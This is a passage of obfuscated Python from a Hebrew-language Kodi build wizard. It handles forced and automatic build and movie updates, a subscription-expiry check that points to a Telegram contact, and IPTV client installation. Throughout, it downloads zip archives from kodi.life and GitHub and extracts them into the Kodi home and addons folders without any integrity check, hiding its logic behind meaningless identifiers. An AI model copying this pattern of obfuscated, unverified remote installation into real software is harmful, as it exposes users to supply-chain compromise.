    O0O0OO00OOO0000OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO000O0OOOOOOOO )#line:4950
    if 'google'in O0O00O0O000O0O0O0 :#line:4953
       googledrive_download_BG (O0O00O0O000O0O0O0 ,O0O0OO00OOO0000OO ,DP2 ,wiz .checkBuild (OOO0O00O000000O0O ,'updatesize'))#line:4954
    else :#line:4955
      downloaderbg .download3 (O0O00O0O000O0O0O0 ,O0O0OO00OOO0000OO ,DP2 )#line:4956
    xbmc .sleep (100 )#line:4957
    DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:4958
    DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:4959
    extract .all2 (O0O0OO00OOO0000OO ,HOME ,DP2 )#line:4960
    DP2 .close ()#line:4961
    wiz .kodi17Fix ()#line:4965
    if KODIV >=18 and KODIV <19 :#line:4966
        skindialogsettind18 ()#line:4967
    fix_Dialog_Settings17 ()#line:4968
    wiz .setS ("notedismiss","true")#line:4971
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]המערכת עודכנה בהצלחה![/COLOR]'%COLOR2 )#line:4972
    try :os .remove (O0O0OO00OOO0000OO )#line:4973
    except :pass #line:4974
    backup_setting_file ()#line:4975
    if wiz .getS ("dragon")=='true':#line:4976
      try :#line:4977
          dragon_menu_hub ()#line:4978
      except Exception as O0OOOO000OOOOOOOO :#line:4979
         logging .warning ('dragon hub errrrrrrror'+str (O0OOOO000OOOOOOOO ))#line:4980
    if wiz .getS ('sex')=='false':#line:4981
        sex_menu_luck (notify ='false')#line:4982
    if wiz .getS ('tele_widget')=='true':#line:4983
        tv_widget_tele (notify ='false')#line:4984
    OOOOO0O00OOOOO000 =[]#line:4987
    OOOOO0O00OOOOO000 .append (Thread (indicatorfastupdate ,info ))#line:4988
    OOOOO0O00OOOOO000 [0 ].start ()#line:4990
    xbmc .sleep (100 )#line:4992
    infobuild ()#line:4993
def force_update ():#line:4998
    O000O0OO0O0000OO0 =xbmcgui .Dialog ()#line:4999
    O0O0O000OOOO000OO =O000O0OO0O0000OO0 .yesno (ADDONTITLE ,"האם לבצע עדכון מערכת?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:5000
    if O0O0O000OOOO000OO ==1 :#line:5001
        xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:5002
        OOO0000OOOO0O0O00 =wiz .getS ("date_user")#line:5003
        if not OOO0000OOOO0O0O00 =='':#line:5004
            import datetime #line:5005
            OO0OOOO0O00OOO0OO =OOO0000OOOO0O0O00 .split ('.')#line:5006
            OOOO0O0OOOO00O0O0 =datetime .date (int (OO0OOOO0O00OOO0OO [2 ]),int (OO0OOOO0O00OOO0OO [1 ]),int (OO0OOOO0O00OOO0OO [0 ]))#line:5007
            if str (TODAY )>=str (OOOO0O0OOOO00O0O0 ):#line:5008
             wiz .contact_wiz ('המערכת שלך יותר לא מקבלת עדכונים \nלחידוש יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:5010
             sys .exit ()#line:5011
        if wiz .STARTP ()=='ok':#line:5012
            check ()#line:5013
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5014
            xbmc .executebuiltin ("ActivateWindow(home)")#line:5015
            O0OOO0O00OOO00O0O ,OOO00OOOOOOO0OO0O =wiz .splitNotify (NOTIFICATION )#line:5016
            wiz .setS ('noteid',str (O0OOO0O00OOO00O0O ))#line:5017
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]מוריד עדכון[/COLOR]"%COLOR2 )#line:5018
            checkidupdatetele ('ידני: ')#line:5019
    else :#line:5021
      sys .exit ()#line:5022
def clearPackagesStartup ():#line:5024
    O0000OOO0OO0000OO =os .path .join (ADDONS ,'temp')#line:5025
    O00OO00OOO0OO00O0 =datetime .utcnow ()-timedelta (minutes =3 )#line:5026
    O000O0O000OOOOO0O =0 ;OOO0OO0O000O0OOOO =0 #line:5027
    if os .path .exists (PACKAGES ):#line:5028
        O0OO0OO00OOOO0O00 =os .listdir (PACKAGES )#line:5029
        O0OO0OO00OOOO0O00 .sort (key =lambda O0OOO0OO00OOO0O00 :os .path .getmtime (os .path .join (PACKAGES ,O0OOO0OO00OOO0O00 )))#line:5030
        for OO00O00OO0OO0000O in O0OO0OO00OOOO0O00 :#line:5031
            OOOO00O0O0OOOOOO0 =os .path .join (PACKAGES ,OO00O00OO0OO0000O )#line:5032
            OOOOO00O0OOO00O00 =datetime .utcfromtimestamp (os .path .getmtime (OOOO00O0O0OOOOOO0 ))#line:5033
            if os .path .isfile (OOOO00O0O0OOOOOO0 ):#line:5035
                O000O0O000OOOOO0O +=1 #line:5036
                os .unlink (OOOO00O0O0OOOOOO0 )#line:5038
            elif os .path .isdir (OOOO00O0O0OOOOOO0 ):#line:5039
                try :#line:5043
                    shutil .rmtree (OOOO00O0O0OOOOOO0 )#line:5044
                except :pass #line:5045
    if os .path .exists (O0000OOO0OO0000OO ):#line:5046
        O0OO0OO00OOOO0O00 =os .listdir (O0000OOO0OO0000OO )#line:5047
        O0OO0OO00OOOO0O00 .sort (key =lambda O00O00O00O00OO00O :os .path .getmtime (os .path .join (O0000OOO0OO0000OO ,O00O00O00O00OO00O )))#line:5048
        for OO00O00OO0OO0000O in O0OO0OO00OOOO0O00 :#line:5049
            OOOO00O0O0OOOOOO0 =os .path .join (O0000OOO0OO0000OO ,OO00O00OO0OO0000O )#line:5050
            OOOOO00O0OOO00O00 =datetime .utcfromtimestamp (os .path .getmtime (OOOO00O0O0OOOOOO0 ))#line:5051
            if os .path .isfile (OOOO00O0O0OOOOOO0 ):#line:5053
                O000O0O000OOOOO0O +=1 #line:5054
                os .unlink (OOOO00O0O0OOOOOO0 )#line:5056
            elif os .path .isdir (OOOO00O0O0OOOOOO0 ):#line:5057
                try :#line:5061
                    shutil .rmtree (OOOO00O0O0OOOOOO0 )#line:5062
                except :pass #line:5063
def auto_build_update (O00O000O00OOOO000 ):#line:5065
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5066
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5067
    try :#line:5069
        clearPackagesStartup ()#line:5070
    except :pass #line:5071
    if not xbmc .Player ().isPlaying ():#line:5072
        if BUILDNAME ==" Kodi Premium"or os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:5073
            wiz .wizardUpdate ('startup')#line:5074
            if wiz .STARTP ()=='ok':#line:5075
                check ()#line:5076
                if not NOTIFY =='true':#line:5077
                    O00OOOO000O00O000 ,OO000000O0OOOOOOO =wiz .splitNotify (NOTIFICATION )#line:5080
                    if not O00OOOO000O00O000 ==False :#line:5081
                        try :#line:5082
                            O00OOOO000O00O000 =int (O00OOOO000O00O000 );O00O000O00OOOO000 =int (O00O000O00OOOO000 )#line:5083
                            if O00OOOO000O00O000 ==O00O000O00OOOO000 :#line:5084
                                if NOTEDISMISS =='false':#line:5085
                                    checkidupdatetele ('אוטומטי: ')#line:5089
                                else :wiz .log ("[Notifications] id[%s] Dismissed"%int (O00OOOO000O00O000 ),5 )#line:5090
                            elif O00OOOO000O00O000 >O00O000O00OOOO000 :#line:5091
                                wiz .setS ('noteid',str (O00OOOO000O00O000 ))#line:5095
                                wiz .setS ('notedismiss','false')#line:5096
                                checkidupdatetele ('אוטומטי: ')#line:5097
                        except Exception as O0000OOOOOOO00OO0 :#line:5100
                            wiz .log ("Error on Notifications Window: %s"%str (O0000OOOOOOO00OO0 ),5 )#line:5101
def infomovie ():#line:5104
    OOO00O0O0000O0OOO ='http://kodi.life/movie/update_movie.xml'#line:5105
    OOOO00OOOO0O00O00 =wiz .workingURL (OOO00O0O0000O0OOO )#line:5106
    if OOOO00OOOO0O00O00 ==True :#line:5107
        try :#line:5108
            OO0O0O00O00O0O00O ,O0O00OO0O00O0O0O0 =wiz .splitNotify (OOO00O0O0000O0OOO )#line:5109
            if OO0O0O00O00O0O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5110
            if wiz .STARTP ()=='ok':#line:5111
                notify .update_movie (O0O00OO0O00O0O0O0 ,True )#line:5112
        except Exception as O0OOO0OOOOO000O00 :#line:5113
            wiz .log ("Error on Notifications Window: %s"%str (O0OOO0OOOOO000O00 ),5 )#line:5114
    else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5115
def check_update_movie ():#line:5117
    O000OO0O0OOO0OOO0 ='http://kodi.life/movie/update_movie.xml'#line:5119
    OO0O00O0OOO0O00OO =wiz .workingURL (O000OO0O0OOO0OOO0 )#line:5120
    O000OOOOO0000000O =" Kodi Premium"#line:5121
    OO0OO0O0O0O000O00 ='http://kodi.life/movie/movie.zip'#line:5122
    OOOOOO0O000O0OO0O =O000OOOOO0000000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5123
    if not wiz .workingURL (OO0OO0O0O0O000O00 )==True :return #line:5124
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5125
    OO000OOO000000O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO0O000O0OO0O )#line:5127
    while xbmc .Player ().isPlaying ():#line:5128
        time .sleep (1 )#line:5129
    if 'google'in OO0OO0O0O0O000O00 :#line:5130
       googledrive_download_BG (OO0OO0O0O0O000O00 ,OO000OOO000000O00 ,DP2 ,wiz .checkBuild (O000OOOOO0000000O ,'updatesize'))#line:5131
    else :#line:5133
      downloaderbg .download5 (OO0OO0O0O0O000O00 ,OO000OOO000000O00 ,DP2 )#line:5134
    xbmc .sleep (100 )#line:5135
    DP2 .create ('[B][COLOR=green]מעדכן סרטים                         [/COLOR][/B]')#line:5137
    DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5138
    extract .all2 (OO000OOO000000O00 ,HOME ,DP2 )#line:5139
    DP2 .close ()#line:5140
    wiz .setS ("notedismiss3","true")#line:5141
    xbmc .sleep (100 )#line:5142
    try :os .remove (OO000OOO000000O00 )#line:5145
    except :pass #line:5146
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.telemedia?mode=205&url=www)")#line:5147
def auto_movie_update (O000O000OO0O000OO ):#line:5149
    OO000O0OOOO0OOO0O ='http://kodi.life/movie/update_movie.xml'#line:5150
    if BUILDNAME ==" Kodi Premium"or os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:5151
        if wiz .STARTP ()=='ok':#line:5152
            if not NOTIFY3 =='true':#line:5153
                OOO0O0OO0O0OO0OO0 =wiz .workingURL (OO000O0OOOO0OOO0O )#line:5154
                if OOO0O0OO0O0OO0OO0 ==True :#line:5155
                    OO0000O0O0O0O000O ,OO00O0O0OOOOOO00O =wiz .splitNotify (OO000O0OOOO0OOO0O )#line:5156
                    if not OO0000O0O0O0O000O ==False :#line:5157
                        try :#line:5158
                            OO0000O0O0O0O000O =int (OO0000O0O0O0O000O );O000O000OO0O000OO =int (O000O000OO0O000OO )#line:5159
                            if OO0000O0O0O0O000O ==O000O000OO0O000OO :#line:5160
                                if NOTEDISMISS3 =='false':#line:5161
                                    check_update_movie ()#line:5162
                            elif OO0000O0O0O0O000O >O000O000OO0O000OO :#line:5163
                                wiz .setS ('noteid3',str (OO0000O0O0O0O000O ))#line:5165
                                wiz .setS ('notedismiss3','false')#line:5166
                                check_update_movie ()#line:5167
                        except Exception as O0000O0OO00O0O0O0 :#line:5168
                            wiz .log ("Error on Notifications Window: %s"%str (O0000O0OO00O0O0O0 ),5 )#line:5169
                    else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5170
                else :wiz .log ("[Notifications] URL(%s): %s"%(OO000O0OOOO0OOO0O ,OOO0O0OO0O0OO0OO0 ),5 )#line:5171
            else :wiz .log ("[Notifications] Turned Off",5 )#line:5172
def auto_movie_firstbuild (OOO0OOO000OOO00O0 ):#line:5173
    O000OO0O00O0O0000 ='http://kodi.life/movie/update_movie.xml'#line:5174
    if wiz .STARTP ()=='ok':#line:5175
        if not NOTIFY3 =='true':#line:5176
            OO00O00OO0O0OO0O0 =wiz .workingURL (O000OO0O00O0O0000 )#line:5177
            if OO00O00OO0O0OO0O0 ==True :#line:5178
                O00000O0000O00OOO ,O00OOO0OOOOOO00OO =wiz .splitNotify (O000OO0O00O0O0000 )#line:5179
                if not O00000O0000O00OOO ==False :#line:5180
                    try :#line:5181
                        O00000O0000O00OOO =int (O00000O0000O00OOO );OOO0OOO000OOO00O0 =int (OOO0OOO000OOO00O0 )#line:5182
                        checkidupdate_movie ()#line:5183
                        wiz .setS ('notedismiss3','true')#line:5184
                        if O00000O0000O00OOO ==OOO0OOO000OOO00O0 :#line:5185
                            wiz .log ("[Notifications] id[%s] Dismissed"%int (O00000O0000O00OOO ),5 )#line:5186
                        elif O00000O0000O00OOO >OOO0OOO000OOO00O0 :#line:5187
                            wiz .setS ('noteid3',str (O00000O0000O00OOO ))#line:5189
                            wiz .setS ('notedismiss3','true')#line:5190
                    except Exception as OO00OOOO0000O0O00 :#line:5192
                        wiz .log ("Error on Notifications Window: %s"%str (OO00OOOO0000O0O00 ),5 )#line:5193
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5194
            else :wiz .log ("[Notifications] URL(%s): %s"%(O000OO0O00O0O0000 ,OO00O00OO0O0OO0O0 ),5 )#line:5195
        else :wiz .log ("[Notifications] Turned Off",5 )#line:5196
def auto_movie_firstbuild3 (OO00OOO0O00OO000O ):#line:5197
    OOO0OO000O0OOOOOO ='http://kodi.life/movie/update_movie.xml'#line:5198
    if wiz .STARTP ()=='ok':#line:5199
        if not NOTIFY3 =='true':#line:5200
            OOOOO000OO0O0OOO0 =wiz .workingURL (OOO0OO000O0OOOOOO )#line:5201
            if OOOOO000OO0O0OOO0 ==True :#line:5202
                OO0OOOO00OO00OO0O ,O0O000OOOOO0O0O0O =wiz .splitNotify (OOO0OO000O0OOOOOO )#line:5203
                if not OO0OOOO00OO00OO0O ==False :#line:5204
                    try :#line:5205
                        OO0OOOO00OO00OO0O =int (OO0OOOO00OO00OO0O );OO00OOO0O00OO000O =int (OO00OOO0O00OO000O )#line:5206
                        if OO0OOOO00OO00OO0O ==OO00OOO0O00OO000O :#line:5207
                            if NOTEDISMISS3 =='false':#line:5208
                                checkidupdate_movie ()#line:5209
                        elif OO0OOOO00OO00OO0O >OO00OOO0O00OO000O :#line:5210
                            wiz .setS ('noteid3',str (OO0OOOO00OO00OO0O ))#line:5212
                            wiz .setS ('notedismiss3','false')#line:5213
                            checkidupdate_movie ()#line:5214
                    except Exception as OOOOOOO0OO0O00OOO :#line:5215
                        wiz .log ("Error on Notifications Window: %s"%str (OOOOOOO0OO0O00OOO ),5 )#line:5216
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5217
            else :wiz .log ("[Notifications] URL(%s): %s"%(OOO0OO000O0OOOOOO ,OOOOO000OO0O0OOO0 ),5 )#line:5218
        else :wiz .log ("[Notifications] Turned Off",5 )#line:5219
def iptvkodi17_18 ():#line:5223
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:5226
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5227
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5228
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 and KODIV <19 :#line:5232
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5233
              O0O0O00O0O0O00OO0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5235
              OO0OOO0O0000O0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5236
              OOO0O000OOO00O00O =xbmcgui .DialogProgress ()#line:5237
              OOO0O000OOO00O00O .create ("XBMC ISRAEL","Downloading "+'iptv'+'\n'+''+'\n'+'Please Wait')#line:5238
              O00O00O0O00000OOO =os .path .join (OO0OOO0O0000O0000 ,'isr.zip')#line:5239
              O0O00OO0000O00OOO =Request (O0O0O00O0O0O00OO0 )#line:5240
              O0O0O0OOOO00OOO00 =urlopen (O0O00OO0000O00OOO )#line:5241
              O0O0OO0000000O0O0 =xbmcgui .DialogProgress ()#line:5243
              O0O0OO0000000O0O0 .create ("Downloading","Downloading "+'iptv')#line:5244
              O0O0OO0000000O0O0 .update (0 )#line:5245
              O000OOOOOOO0O00O0 =open (O00O00O0O00000OOO ,'wb')#line:5247
              try :#line:5249
                O00OO0OO000OOOOOO =O0O0O0OOOO00OOO00 .info ().getheader ('Content-Length').strip ()#line:5250
                OOOO0O00000O0OOO0 =True #line:5251
              except AttributeError :#line:5252
                    OOOO0O00000O0OOO0 =False #line:5253
              if OOOO0O00000O0OOO0 :#line:5255
                    O00OO0OO000OOOOOO =int (O00OO0OO000OOOOOO )#line:5256
              O0OO000OOO000OOO0 =0 #line:5258
              OOO00O00OOOOO0OOO =time .time ()#line:5259
              while True :#line:5260
                    OOO00O0000OOO00O0 =O0O0O0OOOO00OOO00 .read (8192 )#line:5261
                    if not OOO00O0000OOO00O0 :#line:5262
                        sys .stdout .write ('\n')#line:5263
                        break #line:5264
                    O0OO000OOO000OOO0 +=len (OOO00O0000OOO00O0 )#line:5266
                    O000OOOOOOO0O00O0 .write (OOO00O0000OOO00O0 )#line:5267
                    if not OOOO0O00000O0OOO0 :#line:5269
                        O00OO0OO000OOOOOO =O0OO000OOO000OOO0 #line:5270
                    if O0O0OO0000000O0O0 .iscanceled ():#line:5271
                       O0O0OO0000000O0O0 .close ()#line:5272
                       try :#line:5273
                        os .remove (O00O00O0O00000OOO )#line:5274
                       except :#line:5275
                        pass #line:5276
                       break #line:5277
                    OOOOO000OOOOOO000 =float (O0OO000OOO000OOO0 )/O00OO0OO000OOOOOO #line:5278
                    OOOOO000OOOOOO000 =round (OOOOO000OOOOOO000 *100 ,2 )#line:5279
                    O0OOO000OOO0OO000 =old_div (O0OO000OOO000OOO0 ,(1024 *1024 ))#line:5280
                    OOO0OOOO00OOOOOOO =old_div (O00OO0OO000OOOOOO ,(1024 *1024 ))#line:5281
                    OO000O00O0OOOO0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO000OOO0OO000 ,'teal',OOO0OOOO00OOOOOOO )#line:5282
                    if (time .time ()-OOO00O00OOOOO0OOO )>0 :#line:5283
                      O0O00O000OO0OOO00 =old_div (O0OO000OOO000OOO0 ,(time .time ()-OOO00O00OOOOO0OOO ))#line:5284
                      O0O00O000OO0OOO00 =old_div (O0O00O000OO0OOO00 ,1024 )#line:5285
                    else :#line:5286
                     O0O00O000OO0OOO00 =0 #line:5287
                    O00OO0O000OO0O0OO ='KB'#line:5288
                    if O0O00O000OO0OOO00 >=1024 :#line:5289
                       O0O00O000OO0OOO00 =old_div (O0O00O000OO0OOO00 ,1024 )#line:5290
                       O00OO0O000OO0O0OO ='MB'#line:5291
                    if O0O00O000OO0OOO00 >0 and not OOOOO000OOOOOO000 ==100 :#line:5292
                        OOOO0000OO00O0O00 =old_div ((O00OO0OO000OOOOOO -O0OO000OOO000OOO0 ),O0O00O000OO0OOO00 )#line:5293
                    else :#line:5294
                        OOOO0000OO00O0O00 =0 #line:5295
                    OOO0O0OOOO0O00O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O00O000OO0OOO00 ,O00OO0O000OO0O0OO )#line:5296
                    O0O0OO0000000O0O0 .update (int (OOOOO000OOOOOO000 ),"Downloading "+'iptv'+'\n'+OO000O00O0OOOO0OO +'\n'+OOO0O0OOOO0O00O00 )#line:5298
              O000OO00O0OO0OOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5301
              O000OOOOOOO0O00O0 .close ()#line:5304
              extract .all (O00O00O0O00000OOO ,O000OO00O0OO0OOO0 ,O0O0OO0000000O0O0 )#line:5305
              wiz .kodi17Fix ()#line:5307
              try :#line:5309
                os .remove (O00O00O0O00000OOO )#line:5310
              except :#line:5312
                pass #line:5313
              O0O0OO0000000O0O0 .close ()#line:5314
              xbmc .sleep (5000 )#line:5316
              O0O00O00OO0000O00 ='התקנת לקוח טלוויזיה חיה'#line:5318
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00O00OO0000O00 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5319
              resetkodi ()#line:5320
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5321
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 and KODIV <19 :#line:5322
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5323
              O0O0O00O0O0O00OO0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5324
              OO0OOO0O0000O0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5325
              OOO0O000OOO00O00O =xbmcgui .DialogProgress ()#line:5326
              OOO0O000OOO00O00O .create ("XBMC ISRAEL","Downloading "+'iptv'+'\n'+''+'\n'+'Please Wait')#line:5327
              O00O00O0O00000OOO =os .path .join (OO0OOO0O0000O0000 ,'isr.zip')#line:5328
              O0O00OO0000O00OOO =Request (O0O0O00O0O0O00OO0 )#line:5329
              O0O0O0OOOO00OOO00 =urlopen (O0O00OO0000O00OOO )#line:5330
              O0O0OO0000000O0O0 =xbmcgui .DialogProgress ()#line:5332
              O0O0OO0000000O0O0 .create ("Downloading","Downloading "+'iptv')#line:5333
              O0O0OO0000000O0O0 .update (0 )#line:5334
              O000OOOOOOO0O00O0 =open (O00O00O0O00000OOO ,'wb')#line:5336
              try :#line:5338
                O00OO0OO000OOOOOO =O0O0O0OOOO00OOO00 .info ().getheader ('Content-Length').strip ()#line:5339
                OOOO0O00000O0OOO0 =True #line:5340
              except AttributeError :#line:5341
                    OOOO0O00000O0OOO0 =False #line:5342
              if OOOO0O00000O0OOO0 :#line:5344
                    O00OO0OO000OOOOOO =int (O00OO0OO000OOOOOO )#line:5345
              O0OO000OOO000OOO0 =0 #line:5347
              OOO00O00OOOOO0OOO =time .time ()#line:5348
              while True :#line:5349
                    OOO00O0000OOO00O0 =O0O0O0OOOO00OOO00 .read (8192 )#line:5350
                    if not OOO00O0000OOO00O0 :#line:5351
                        sys .stdout .write ('\n')#line:5352
                        break #line:5353
                    O0OO000OOO000OOO0 +=len (OOO00O0000OOO00O0 )#line:5355
                    O000OOOOOOO0O00O0 .write (OOO00O0000OOO00O0 )#line:5356
                    if not OOOO0O00000O0OOO0 :#line:5358
                        O00OO0OO000OOOOOO =O0OO000OOO000OOO0 #line:5359
                    if O0O0OO0000000O0O0 .iscanceled ():#line:5360
                       O0O0OO0000000O0O0 .close ()#line:5361
                       try :#line:5362
                        os .remove (O00O00O0O00000OOO )#line:5363
                       except :#line:5364
                        pass #line:5365
                       break #line:5366
                    OOOOO000OOOOOO000 =float (O0OO000OOO000OOO0 )/O00OO0OO000OOOOOO #line:5367
                    OOOOO000OOOOOO000 =round (OOOOO000OOOOOO000 *100 ,2 )#line:5368
                    O0OOO000OOO0OO000 =old_div (O0OO000OOO000OOO0 ,(1024 *1024 ))#line:5369
                    OOO0OOOO00OOOOOOO =old_div (O00OO0OO000OOOOOO ,(1024 *1024 ))#line:5370
                    OO000O00O0OOOO0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO000OOO0OO000 ,'teal',OOO0OOOO00OOOOOOO )#line:5371
                    if (time .time ()-OOO00O00OOOOO0OOO )>0 :#line:5372
                      O0O00O000OO0OOO00 =old_div (O0OO000OOO000OOO0 ,(time .time ()-OOO00O00OOOOO0OOO ))#line:5373
                      O0O00O000OO0OOO00 =old_div (O0O00O000OO0OOO00 ,1024 )#line:5374
                    else :#line:5375
                     O0O00O000OO0OOO00 =0 #line:5376
                    O00OO0O000OO0O0OO ='KB'#line:5377
                    if O0O00O000OO0OOO00 >=1024 :#line:5378
                       O0O00O000OO0OOO00 =old_div (O0O00O000OO0OOO00 ,1024 )#line:5379
                       O00OO0O000OO0O0OO ='MB'#line:5380
                    if O0O00O000OO0OOO00 >0 and not OOOOO000OOOOOO000 ==100 :#line:5381
                        OOOO0000OO00O0O00 =old_div ((O00OO0OO000OOOOOO -O0OO000OOO000OOO0 ),O0O00O000OO0OOO00 )#line:5382
                    else :#line:5383
                        OOOO0000OO00O0O00 =0 #line:5384
                    OOO0O0OOOO0O00O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O00O000OO0OOO00 ,O00OO0O000OO0O0OO )#line:5385
                    O0O0OO0000000O0O0 .update (int (OOOOO000OOOOOO000 ),"Downloading "+'iptv'+'\n'+OO000O00O0OOOO0OO +'\n'+OOO0O0OOOO0O00O00 )#line:5387
              O000OO00O0OO0OOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5390
              O000OOOOOOO0O00O0 .close ()#line:5393
              extract .all (O00O00O0O00000OOO ,O000OO00O0OO0OOO0 ,O0O0OO0000000O0O0 )#line:5394
              wiz .kodi17Fix ()#line:5395
              try :#line:5397
                os .remove (O00O00O0O00000OOO )#line:5398
              except :#line:5400
                pass #line:5401
              O0O0OO0000000O0O0 .close ()#line:5402
              xbmc .sleep (5000 )#line:5404
              O0O00O00OO0000O00 ='התקנת לקוח טלוויזיה חיה'#line:5406
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00O00OO0000O00 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5407
              resetkodi ()#line:5408
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5410
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:5411
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5412
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5413
def kodi17_18pack ():#line:5417
    OOO00OOO000O0OOO0 ='https://github.com/vip200/Build/blob/master/17pack.zip?raw=true'#line:5418
    OOO0O00OO000OOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5419
    OO000O000O00OOOO0 =os .path .join (PACKAGES ,'isr.zip')#line:5422
    O00O00OO000O0000O =Request (OOO00OOO000O0OOO0 )#line:5423
    O0OOO0OOO0OOOO000 =urlopen (O00O00OO000O0000O )#line:5424
    OOOO0OOOO00OO00O0 =xbmcgui .DialogProgress ()#line:5426
    OOOO0OOOO00OO00O0 .create ("[B][COLOR=yellow]מוריד חבילת קבצים[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:5427
    OOOO0OOOO00OO00O0 .update (0 )#line:5428
    O0O0OO00O0OO00OOO =open (OO000O000O00OOOO0 ,'wb')#line:5430
    try :#line:5432
      O0O00O0O0OOOO00OO =O0OOO0OOO0OOOO000 .info ().getheader ('Content-Length').strip ()#line:5433
      OO0O00O0OO00OOO0O =True #line:5434
    except AttributeError :#line:5435
          OO0O00O0OO00OOO0O =False #line:5436
    if OO0O00O0OO00OOO0O :#line:5438
          O0O00O0O0OOOO00OO =int (O0O00O0O0OOOO00OO )#line:5439
    OOO00O0OOO0OOO000 =0 #line:5441
    O0O0000OOO0OOOO0O =time .time ()#line:5442
    while True :#line:5443
          OOOOO0O0O0OOOO0OO =O0OOO0OOO0OOOO000 .read (8192 )#line:5444
          if not OOOOO0O0O0OOOO0OO :#line:5445
              sys .stdout .write ('\n')#line:5446
              break #line:5447
          OOO00O0OOO0OOO000 +=len (OOOOO0O0O0OOOO0OO )#line:5449
          O0O0OO00O0OO00OOO .write (OOOOO0O0O0OOOO0OO )#line:5450
          if not OO0O00O0OO00OOO0O :#line:5452
              O0O00O0O0OOOO00OO =OOO00O0OOO0OOO000 #line:5453
          if OOOO0OOOO00OO00O0 .iscanceled ():#line:5454
             OOOO0OOOO00OO00O0 .close ()#line:5455
             try :#line:5456
              os .remove (OO000O000O00OOOO0 )#line:5457
             except :#line:5458
              pass #line:5459
             break #line:5460
          OO0O0OOO0OO00000O =float (OOO00O0OOO0OOO000 )/O0O00O0O0OOOO00OO #line:5461
          OO0O0OOO0OO00000O =round (OO0O0OOO0OO00000O *100 ,2 )#line:5462
          O0OOOO0000OO0O000 =OOO00O0OOO0OOO000 /(1024 *1024 )#line:5463
          OOOOO00O000O00000 =O0O00O0O0OOOO00OO /(1024 *1024 )#line:5464
          O00O00OOO00O00OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOO0000OO0O000 ,'teal',OOOOO00O000O00000 )#line:5465
